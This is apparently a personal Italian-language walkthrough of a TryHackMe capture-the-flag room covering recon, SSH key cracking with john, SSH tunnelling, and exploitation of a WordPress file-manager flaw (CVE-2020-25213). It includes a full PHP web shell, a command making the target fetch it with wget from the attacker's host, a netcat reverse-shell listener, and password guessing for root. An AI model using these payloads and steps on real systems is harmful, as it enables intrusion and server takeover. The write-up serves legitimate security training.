
#tryhackmelabs #laboratorio 

https://tryhackme.com/r/room/badbyte
==Reconnaissance==`
```
sudo nmap -sV -O -v -p- 10.10.150.52
```

```
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
30024/tcp open  ftp     vsftpd 3.0.3
```

```
sudo nmap -A -sCV -p 22,30024 10.10.150.52
```

```
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f3:a2:ed:93:4b:9c:bf:bb:33:4d:48:0d:fe:a4:de:96 (RSA)
|   256 22:72:00:36:eb:37:12:9f:5a:cc:c2:73:e0:4f:f1:4e (ECDSA)
|_  256 78:1d:79:dc:8d:41:f6:77:60:65:f5:74:b6:cc:8b:6d (ED25519)
30024/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.21.9.220
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 ftp      ftp          1743 Mar 23  2021 id_rsa
|_-rw-r--r--    1 ftp      ftp            78 Mar 23  2021 note.txt
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Adtran 424RG FTTH gateway (93%), Linux 2.6.32 (93%), Linux 2.6.39 - 3.2 (93%), Linux 3.11 (93%), Linux 3.2 - 4.9 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OSs: Linux, Unix; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 30024/tcp)
HOP RTT      ADDRESS
1   49.15 ms 10.21.0.1
2   49.25 ms 10.10.150.52

```

==Foothold==(punto di appoggio)

John the Ripper è uno strumento di verifica della sicurezza delle password e di recupero password Open Source disponibile per molti sistemi operativi. Dai un'occhiata a Crackthehash o Crackthehash2 per ulteriori cracking di hash. Per crackare la chiave privata ssh, usa prima lo script python ssh2john convert private key to hash (viene fornito con Kali Linux. Esegui locate ssh2john).

```
python path/to/ssh2john.py privatekey > privatekey.hash
```

Poi usa John per rompere l'hashish

```
john privatekey.hash -w=/path/to/wordlist
```

Crackare la passphrase della chiave privata e accedere tramite SSH alla macchina. Assicurarsi di modificare i permessi file della chiave privata SSH a 600.
```
ftp 10.10.150.52 30024
```
```
ftp 10.10.150.52 30024
Connected to 10.10.150.52.
220 (vsFTPd 3.0.3)
Name (10.10.150.52:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||14134|)
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp          1743 Mar 23  2021 id_rsa
-rw-r--r--    1 ftp      ftp            78 Mar 23  2021 note.txt
226 Directory send OK.
ftp> cat note.txt
?Invalid command.
ftp> less note.txt
I always forget my password. Just let me store an ssh key here.
- errorcauser
ftp> less id_rsa
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: DES-EDE3-CBC,25B4B9725AB330EC

LGINB6oiLaGhDgr5D0+9C7+AJTyQbIlBNu8rAYNtlwvn7uN2z5L17esJRr0/PEW/
4NvSoR5TeSRkyufK2mLJU0K7uscPx1JE9Lk9excqhK6N7Sau+v0b/AC3lAGzsnrf
2ztSYVcoooTt9sIDQ/+GmiIrM7rnQMkm20QapnUvUrkThJ/rB3lY3JXayfVWnvuC
Rtke/t20R82D0MFfGD3d57nZ3Q92P7tu35/azcKeR1nJq4UyIgRjdS/3wFA+NwJh
fxMNL14mgYdaBFuhKsj6jv0Ed/AsCUhrB9VcPPkHCaawv386oUv6JDLg/jEExiQc
V88vRUoFglW5a6FpfV/UPrySr4oGoSHTToBFkTQkMKg8FM3vpQXUw8CpENyYr4qj
BFMnKWDR1vuzwEITVNYunIRe9DxbO1mzgEyDWyyX9JUNNCpfWiwLx/MqNzKvkBdD
nqDGt8imMao82j77nmT5H8D+EkaCfze9SBrPPDtKm07mD+iO8ULWnIgRMtAykpj2
SYCg5CCadtXXsjuupR89Kbp8c6V+s3lsYZPp8QZQbiAgr3GqwSpat/7ZvCySzB37
0JmKjrapijObX03XRyOiGXxsUk+slNwnkWIh8Usl8YyD/Vmeg9Qdxxn6EpKy/vcY
dsQQAFYQcbKvYndnNIXnyKTsOYo6Qo8AoRzuWjkaOrRJoZoUJ6FEZED0NMXkgO2D
SCtS98+tRH2PXKajeYi7LXeRB5MOybhshAtM4ogMuuNe4PQfEePuZAInjAsdkLl1
y1RfoCQC9x6OIvd5ONVBpZ5ilNLxthj4MOXAhPPOnCtl5EvXA8oaOXFdDyM33UbA
/oTurtIzT0+UW+Am8jcFQLrBaKIXXZtkqdVjiAXoophbSKoYZzTfZsLVt1DHhf9h
H2mkT3gtKZVjNvkaEhE+wNQL2Dto6VA/xpI8Ug4cShsUwmdrRu3XBTf5NFPEcr1u
CersQnKRV5JG84rcI2J+XKZglG/aBRSnK3rnUPzJjA1pZCZdsmwjvYt2tPzsKJLB
5c8FU+XS3a20QRtMTkHb624pwjKemZ03VxSGSuvRJLvKZ43XMKvJ6zuNHZNUkU13
I6Ld/IIUlv6xwHFEOLg1hIqn3gl9uVzZ2fHDC+9AWLuJqPSa22sOHJ3FYlXaWQt4
BcYkLXvaO3a8btpgD/lwvMPpJZHHfuex1GVMqt208CZMQmdTtRB618rsDZnWxND8
oWRC0uHns8gn9qdeXbjCZx2l+VzLT5Lk/19zBZsBtFIyd5Mj+he+BkDPVMvUNKwY
97Y5v6F6PbJrAVXvjGo6k6+cIXr97Wdojotw+xR/vUdGhjOclZPmjUbDmFFLELIK
ZcWgXCOCNdP4Unrh2c96PYaY/GqmeGl0C206A8t4dbfe/pr1wjklWWRXp+O02QJ+
o3c/PC6Za8IUca8VvmpAT0M1sAiMFTeDWLMSL6Z1CxH1cLVGpSf7ITRFIiDHLGDq
v6fSxb2wsx+qDnk4tO25bXq37HqqSBNw0/NyjOWe//5QE0Q5PWuoEVP/huCKcFHb
mTDaYO2KwZXCse7derYJ0eWpKiiKcmGwmi57m+uvTka+o8xA928/xw==
-----END RSA PRIVATE KEY-----

```

```
user=errorcauser
```

```
mget id_rsa
```

```
mget id_rsa [anpqy?]? y
229 Entering Extended Passive Mode (|||15518|)
150 Opening BINARY mode data connection for id_rsa (1743 bytes).
100% |****************************************************************************************************************************************|  1743        2.95 MiB/s   
226 Transfer complete.
1743 bytes received in 00:00 (32.09 KiB/s)

```

```
python /usr/share/john/ssh2john.py id_rsa > id_rsa.hash
```

```
john id_rsa.hash -w=/usr/share/wordlists/rockyou.txt
```

```
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 1 for all loaded hashes
Cost 2 (iteration count) is 2 for all loaded hashes
Will run 3 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
cupcake          (id_rsa)     
1g 0:00:00:00 DONE (2024-11-19 14:24) 4.000g/s 2496p/s 2496c/s 2496C/s yankees..cheche
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```

```
 passphrase=cupcake
```

==Port Forwarding==

Secondo Wikipedia SSH o Secure Shell è un protocollo di rete crittografico per gestire servizi di rete in modo sicuro su una rete non protetta. Le applicazioni tipiche includono la riga di comando remota, l'accesso e l'esecuzione di comandi remoti, ma qualsiasi servizio di rete può essere protetto con SSH. Di seguito sono riportati alcuni flag importanti che verranno utilizzati in questa attività.

|   |   |
|---|---|
|-io|Se si desidera accedere a un server remoto utilizzando una chiave privata.|
|-L|Per l'inoltro delle porte locali. Seguito da  <br><br>porta_locale:indirizzo_remoto:porta_remota|
|-R|Per l'inoltro delle porte remote. Seguito da  <br><br>porta:indirizzo_locale:porta_locale|
|-D|Per l'inoltro dinamico delle porte. Crea un proxy SOCKS su localhost. Seguito da  <br><br>porta_locale|
|-N|Non eseguire un comando remoto. Questo è utile solo per inoltrare le porte|

BlueServer10.0.0.1------------------>Firewall porta 80               RedServer 192.168.0.2
porta 22------------------------------------------------------------------------->porta22


BlueServer10.0.0.1                      SSH Tunnel                             RedServer 192.168.0.2
porta 8080---------------------------------------------------------------------->porta80

Nell'immagine sopra l'utente del server blu vuole connettersi alla porta 80 sul server rosso ma la porta è bloccata dal firewall. L'utente può connettersi tramite ssh e creare un tunnel che gli consentirebbe di connettersi alla porta 80 sul server rosso. In questo caso l'utente può usare Local port forwarding per connettere la porta sul server rosso alla sua macchina locale.

1. Imposta **l'inoltro dinamico delle porte** tramite SSH .  
    **SUGGERIMENTO:** `-i id_rsa -D 1337`  
    
2. Imposta proxychains per il **Dynamic Port Forwarding** . Assicurati di aver commentato `socks4 127.0.0.1 9050`la configurazione di proxychains e di aggiungerla `socks5 127.0.0.1 1337`alla fine del file di configurazione ( `/etc/proxychains.conf`).  
    Il nome del file può variare a seconda della distribuzione che stai utilizzando.

```
	  sock5 127.0.0.1 1337
```
3. Esegui una scansione delle porte per enumerare le porte interne sul server usando proxychains. Se usi Nmap il tuo comando dovrebbe apparire così `proxychains nmap -sT 127.0.0.1`.
4. Dopo aver trovato la porta del webserver, esegui **l'inoltro della porta locale** su quella porta utilizzando SSH con il flag **-L .**  
    **SUGGERIMENTO** : `-i id_rsa -L 80:127.0.0.1:(remote port)`(prova a usare con sudo)


==in pratica==
```
chmod 600 id_rsa
```

```
ssh -i id_rsa -D 1337 user@server_rosso
```
	-D 1337 crea un tunnel SOCKS sulla porta 1337

1) ==Ci connettiamo creando un tunnel SOCKS su porta 1337== 
```
ssh -i id_rsa -D 1337 errorcauser@10.10.56.48
```
Siamo accolti da una shell molto limitata! Per la scansione Dynamic Port Forwarding abbiamo bisogno di proxychains!
2) ==Aprimao alto terminale ed impostiamo is sock5 nel file di configurazione di proxychains==
```
sudo nano /etc/proxychains4.conf
```
- Commenta la riga `socks4 127.0.0.1 9050` aggiungendo un `#` all'inizio della riga.
- Aggiungi la seguente riga alla fine del file:
```
socks5 127.0.0.1 1337
```
3) ==Eseguiamo una scansione delle porte usando proxychains==
```
proxychains nmap -sT 127.0.0.1
```

```
[proxychains] Strict chain  ...  127.0.0.1:1337  ...  127.0.0.1:25 <--socket error or timeout!
[proxychains] Strict chain  ...  127.0.0.1:1337  ...  127.0.0.1:8080 <--socket error or timeout!
[proxychains] Strict chain  ...  127.0.0.1:1337  ...  127.0.0.1:139 <--socket error or timeout!
[proxychains] Strict chain  ...  127.0.0.1:1337  ...  127.0.0.1:22  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1337  ...  127.0.0.1:110 <--socket error or timeout!
[proxychains] Strict chain  ...  127.0.0.1:1337  ...  127.0.0.1:199 <--socket error or timeout!
[proxychains] Strict chain  ...  127.0.0.1:1337  ...  127.0.0.1:23 <--socket error or timeout!
[proxychains] Strict chain  ...  127.0.0.1:1337  ...  127.0.0.1:21 <--socket error or timeout!
[proxychains] Strict chain  ...  127.0.0.1:1337  ...  127.0.0.1:3306  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1337  ...  127.0.0.1:8888 <--socket error or timeout!
[proxychains] Strict chain  ...  127.0.0.1:1337  ...  127.0.0.1:53 <--socket error or timeout!
[proxychains] Strict chain  ...  127.0.0.1:1337  ...  127.0.0.1:587 <--socket error or timeout!
[proxychains] Strict chain  ...  127.0.0.1:1337  ...  127.0.0.1:135 <--socket error or timeout!

```
4) ==Inoltriamo la porta locale su quella porta utilizzando SSH==
```
ssh -i id_rsa -L 8080:127.0.0.1:80 user@server_rosso
```

```
ssh -i id_rsa -L 8080:127.0.0.1:80 errorcauser@10.10.56.48
```
- -L 80:127.0.0.1:80 inoltra la porta 8080 della tua macchina locale alla porta 80 del server rosso.
- Puoi eseguire questo comando con `sudo` se necessario.

==Web Exploitation==

Da usare `nmap` per cercare la vulnerabilità nel CMS in esecuzione sul webserver. Nmap ha uno script che può trovare vulnerabilità nel CMS utilizzato in questa macchina.

Ora che hai inoltrato la porta localmente, il server web è in esecuzione su localhost e puoi accedervi dal tuo browser.  
```
http://127.0.0.1:8080/
```
In questo compito:

1. Esegui la scansione del server web interno e trova i plugin vulnerabili utilizzando Nmap o il famoso strumento di scansione per questo CMS .
2. Sfruttare la vulnerabilità utilizzando metasploit o seguendo una qualsiasi POC (proof of concept).
3. Ottieni il flag dell'utente.


```
nmap -sV --script http-wordpress-enum 127.0.0.1 8080
```

```
nuclei -u http://127.0.0.1:8080
```
[CVE-2020-25213] [http] [critical] http://127.0.0.1:8080/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php

 Wordpress Plugin Duplicator 1.3.26
```
searchsploit Wordpress Plugin Duplicator
```
CVE-2018-03-15
CVE-2020-25213

```
-bash-4.4$ cat note.txt
Hi Error!
I've set up a webserver locally so no one outside could access it.
It is for testing purposes only.  There are still a few things I need to do like setting up a custom theme.
You can check it out, you already know what to do.
-Cth
:)
```
```
user=Cth
```

```
searchsploit WP-file-manager
```
	CVE-2020-25213

```
searchsploit -m WP-file-manager
```

```
searchsploit -m 51224 
```

```
python 51224.py http://127.0.0.1:8080/ id 
```

Farò un backdoor a questa casella con un uploader di file php. Puoi scaricare il file php
```
nano mini.php
```

```
<?php
set_time_limit(0);
error_reporting(0);

if(get_magic_quotes_gpc()){
foreach($_POST as $key=>$value){
$_POST[$key] = stripslashes($value);
}
}
echo '<!DOCTYPE HTML>
<HTML>
<HEAD>
<link href="" rel="stylesheet" type="text/css">
<title>Mini Shell</title>
<style>
body{
font-family: "Racing Sans One", cursive;
background-color: #e6e6e6;
text-shadow:0px 0px 1px #757575;
}
#content tr:hover{
background-color: #636263;
text-shadow:0px 0px 10px #fff;
}
#content .first{
background-color: silver;
}
#content .first:hover{
background-color: silver;
text-shadow:0px 0px 1px #757575;
}
table{
border: 1px #000000 dotted;
}
H1{
font-family: "Rye", cursive;
}
a{
color: #000;
text-decoration: none;
}
a:hover{
color: #fff;
text-shadow:0px 0px 10px #ffffff;
}
input,select,textarea{
border: 1px #000000 solid;
-moz-border-radius: 5px;
-webkit-border-radius:5px;
border-radius:5px;
}
</style>
</HEAD>
<BODY>
<H1><center><img src="https://s.yimg.com/lq/i/mesg/emoticons7/19.gif"/>
 Mini Shell <img src="https://s.yimg.com/lq/i/mesg/emoticons7/19.gif"/>
 </center></H1>
<table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
<tr><td>Direktori : ';
if(isset($_GET['path'])){
$path = $_GET['path'];
}else{
$path = getcwd();
}

$path = str_replace('\\','/',$path);
$paths = explode('/',$path);

foreach($paths as $id=>$pat){
if($pat == '' && $id == 0){
$a = true;
echo '<a href="?path=/">/</a>';
continue;
}
if($pat == '') continue;
echo '<a href="?path=';
for($i=0;$i<=$id;$i++){
echo "$paths[$i]";
if($i != $id) echo "/";
}
echo '">'.$pat.'</a>/';
}
echo '</td></tr><tr><td>';
if(isset($_FILES['file'])){
if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){

echo '<font color="green">File Ter-Upload :* </font><br />';
}else{
echo '<font color="red">Upload gagal, Servernya kek <img src="http://c.fastcompany.net/asset_files/-/2014/11/11/4F4.gif"/>
 </font><br />';
}
}
echo '<form enctype="multipart/form-data" method="POST">
Upload File : <input type="file" name="file" />
<input type="submit" value="upload" />
</form>
</td></tr>';
if(isset($_GET['filesrc'])){
echo "<tr><td>Current File : ";
echo $_GET['filesrc'];
echo '</tr></td></table><br />';
echo('<pre>'.htmlspecialchars(file_get_contents($_GET['filesrc'])).'</pre>');
}elseif(isset($_GET['option']) && $_POST['opt'] != 'delete'){
echo '</table><br /><center>'.$_POST['path'].'<br /><br />';
if($_POST['opt'] == 'chmod'){
if(isset($_POST['perm'])){
if(chmod($_POST['path'],$_POST['perm'])){
echo '<font color="green">Change Permission Done.</font><br />';
}else{
echo '<font color="red">Change Permission Error.</font><br />';
}
}
echo '<form method="POST">
Permission : <input name="perm" type="text" size="4" value="'.substr(sprintf('%o', fileperms($_POST['path'])), -4).'" />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="chmod">
<input type="submit" value="Go" />
</form>';
}elseif($_POST['opt'] == 'rename'){
if(isset($_POST['newname'])){
if(rename($_POST['path'],$path.'/'.$_POST['newname'])){
echo '<font color="green">Change Name Done.</font><br />';
}else{
echo '<font color="red">Change Name Error.</font><br />';
}
$_POST['name'] = $_POST['newname'];
}
echo '<form method="POST">
New Name : <input name="newname" type="text" size="20" value="'.$_POST['name'].'" />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="rename">
<input type="submit" value="Go" />
</form>';
}elseif($_POST['opt'] == 'edit'){
if(isset($_POST['src'])){
$fp = fopen($_POST['path'],'w');
if(fwrite($fp,$_POST['src'])){
echo '<font color="green">Edit File Done ~_^.</font><br />';
}else{
echo '<font color="red">Edit File Error ~_~.</font><br />';
}
fclose($fp);
}
echo '<form method="POST">
<textarea cols=80 rows=20 name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="edit">
<input type="submit" value="Go" />
</form>';
}
echo '</center>';
}else{
echo '</table><br /><center>';
if(isset($_GET['option']) && $_POST['opt'] == 'delete'){
if($_POST['type'] == 'dir'){
if(rmdir($_POST['path'])){
echo '<font color="green">Delete Dir Done.</font><br />';
}else{
echo '<font color="red">Delete Dir Error.</font><br />';
}
}elseif($_POST['type'] == 'file'){
if(unlink($_POST['path'])){
echo '<font color="green">Delete File Done.</font><br />';
}else{
echo '<font color="red">Delete File Error.</font><br />';
}
}
}
echo '</center>';
$scandir = scandir($path);
echo '<div id="content"><table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
<tr class="first">
<td><center>Name</center></td>
<td><center>Size</center></td>
<td><center>Permissions</center></td>
<td><center>Options</center></td>
</tr>';

foreach($scandir as $dir){
if(!is_dir("$path/$dir") || $dir == '.' || $dir == '..') continue;
echo "<tr>
<td><a href=\"?path=$path/$dir\">$dir</a></td>
<td><center>--</center></td>
<td><center>";
if(is_writable("$path/$dir")) echo '<font color="green">';
elseif(!is_readable("$path/$dir")) echo '<font color="red">';
echo perms("$path/$dir");
if(is_writable("$path/$dir") || !is_readable("$path/$dir")) echo '</font>';

echo "</center></td>
<td><center><form method=\"POST\" action=\"?option&path=$path\">
<select name=\"opt\">
<option value=\"\"></option>
<option value=\"delete\">Delete</option>
<option value=\"chmod\">Chmod</option>
<option value=\"rename\">Rename</option>
</select>
<input type=\"hidden\" name=\"type\" value=\"dir\">
<input type=\"hidden\" name=\"name\" value=\"$dir\">
<input type=\"hidden\" name=\"path\" value=\"$path/$dir\">
<input type=\"submit\" value=\">\" />
</form></center></td>
</tr>";
}
echo '<tr class="first"><td></td><td></td><td></td><td></td></tr>';
foreach($scandir as $file){
if(!is_file("$path/$file")) continue;
$size = filesize("$path/$file")/1024;
$size = round($size,3);
if($size >= 1024){
$size = round($size/1024,2).' MB';
}else{
$size = $size.' KB';

}

echo "<tr>
<td><a href=\"?filesrc=$path/$file&path=$path\">$file</a></td>
<td><center>".$size."</center></td>
<td><center>";
if(is_writable("$path/$file")) echo '<font color="green">';
elseif(!is_readable("$path/$file")) echo '<font color="red">';
echo perms("$path/$file");
if(is_writable("$path/$file") || !is_readable("$path/$file")) echo '</font>';
echo "</center></td>
<td><center><form method=\"POST\" action=\"?option&path=$path\">
<select name=\"opt\">
<option value=\"\"></option>
<option value=\"delete\">Delete</option>
<option value=\"chmod\">Chmod</option>
<option value=\"rename\">Rename</option>
<option value=\"edit\">Edit</option>
</select>
<input type=\"hidden\" name=\"type\" value=\"file\">
<input type=\"hidden\" name=\"name\" value=\"$file\">
<input type=\"hidden\" name=\"path\" value=\"$path/$file\">
<input type=\"submit\" value=\">\" />
</form></center></td>
</tr>";
}
echo '</table>
</div>';
}
echo '<center><br />Zerion Mini Shell <font color="green">1.0</font></center>
</BODY>
</HTML>';
function perms($file){
$perms = fileperms($file);

if (($perms & 0xC000) == 0xC000) {

// Socket
$info = 's';
} elseif (($perms & 0xA000) == 0xA000) {
// Symbolic Link
$info = 'l';
} elseif (($perms & 0x8000) == 0x8000) {
// Regular
$info = '-';
} elseif (($perms & 0x6000) == 0x6000) {
// Block special
$info = 'b';
} elseif (($perms & 0x4000) == 0x4000) {
// Directory
$info = 'd';
} elseif (($perms & 0x2000) == 0x2000) {
// Character special
$info = 'c';
} elseif (($perms & 0x1000) == 0x1000) {
// FIFO pipe
$info = 'p';
} else {
// Unknown
$info = 'u';
}

// Owner
$info .= (($perms & 0x0100) ? 'r' : '-');
$info .= (($perms & 0x0080) ? 'w' : '-');
$info .= (($perms & 0x0040) ?
(($perms & 0x0800) ? 's' : 'x' ) :
(($perms & 0x0800) ? 'S' : '-'));


// Group
$info .= (($perms & 0x0020) ? 'r' : '-');
$info .= (($perms & 0x0010) ? 'w' : '-');
$info .= (($perms & 0x0008) ?
(($perms & 0x0400) ? 's' : 'x' ) :
(($perms & 0x0400) ? 'S' : '-'));

// World
$info .= (($perms & 0x0004) ? 'r' : '-');
$info .= (($perms & 0x0002) ? 'w' : '-');

$info .= (($perms & 0x0001) ?
(($perms & 0x0200) ? 't' : 'x' ) :
(($perms & 0x0200) ? 'T' : '-'));

return $info;
}
?>
```

```
python -m http.server 80 
```

```
python 51224.py "http://127.0.0.1:8080/" "wget http://10.21.9.220/mini.php"
```

```
python 51224.py "http://127.0.0.1:8080/" "pwd"                             
/usr/share/wordpress/wp-content/plugins/wp-file-manager/lib/files
```

```
http://127.0.0.1:8080/wp-content/plugins/wp-file-manager/lib/files/mini.php
```

```
https://www.revshells.com/?source=post_page-----94dc930353c2--------------------------------
```
Creo revshell php  pentestmonkey e inserisco in shell.php di mini shell
```
nc -lvnp 2234
```

```
$ cd cth
$ ls
user.txt
$ less user.txt
THM{227906201d17d9c45aa93d0122ea1af7}
```

==Privilege Escalation==

Le password sono un concetto piuttosto semplice e possono essere un modo efficace per proteggere informazioni sensibili. Garantire che solo le persone che conoscono il "codice segreto" abbiano accesso a una determinata risorsa aiuta ad alzare l'asticella per gli aggressori che tentano di ottenere un accesso illegittimo. Le password possono sicuramente essere perse o rubate, soprattutto quando sono scarsamente protette. A volte l'utente può riutilizzare la stessa password o modificarla leggermente dopo una violazione dei dati. Ad esempio, può cambiarla da "Goodpassword2019" a "Goodpassword2020" o da "Autumn20!" a "Spring20!". Se l'aggressore mette le mani sul vecchio dump del database dell'azienda e trova uno schema nelle password utilizzate, l'aggressore può indovinare la password corretta. In questa attività: scopri che l'utente ha lasciato la password da qualche parte accidentalmente. La gestione ora richiede che le sessioni SSH vengano registrate. Indovina la nuova password dell'utente. Ottieni il flag di root.

```
cat /var/log/bash.log
```

```
Script started on 2021-03-23 21:05:06+0000
cth@badbyte:~$ whoami
cth
cth@badbyte:~$ date
Tue 23 Mar 21:05:14 UTC 2021
cth@badbyte:~$ suod su

Command 'suod' not found, did you mean:

  command 'sudo' from deb sudo
  command 'sudo' from deb sudo-ldap

Try: sudo apt install <deb name>

cth@badbyte:~$ G00dP@$sw0rd2020
G00dP@: command not found
cth@badbyte:~$ passwd
Changing password for cth.
(current) UNIX password: 
Enter new UNIX password: 
Retype new UNIX password: 
passwd: password updated successfully
cth@badbyte:~$ ls
cth@badbyte:~$ cowsay "vim >>>>>>>>>>>>>>>>> nano"

```

```
G00dP@$sw0rd2021
```

trattamento console

```
sudo -l
```

```
G00dP@$sw0rd2021
```

```
sudo su root
```

```
root@badbyte:/home/cth# cd /root
root@badbyte:~# ls
root.txt
root@badbyte:~# cat root
cat: root: No such file or directory
root@badbyte:~# cat root.txt
  |      ______    ________   ________              ______        _____________ __________  |
  |     / ____ \  /  ___   \ /   ____ \            / ____ \      /____    ____//   ______/\ |
  |    / /___/_/ /  /__/   //   /   / /\          / /___/_/      \___/   /\___/   /______\/ |
  |   / _____ \ /  ____   //   /   / / /         / _____ \ __   ___ /   / /  /   ____/\     |
  |  / /____/ //  / __/  //   /___/ / /         / /____/ //  | /  //   / /  /   /____\/     |
  | /________//__/ / /__//_________/ /         /________/ |  \/  //___/ /  /   /________    |
  | \________\\__\/  \__\\_________\/          \________\  \    / \___\/  /____________/\   | 
  |                                  _________           __/   / /        \____________\/   |
  |                                 /________/\         /_____/ /                           |
  |                                 \________\/         \_____\/                            |

THM{xxxxxxxxxxxx}

```

```
THM{xxxxxxxxxxxxx}
```




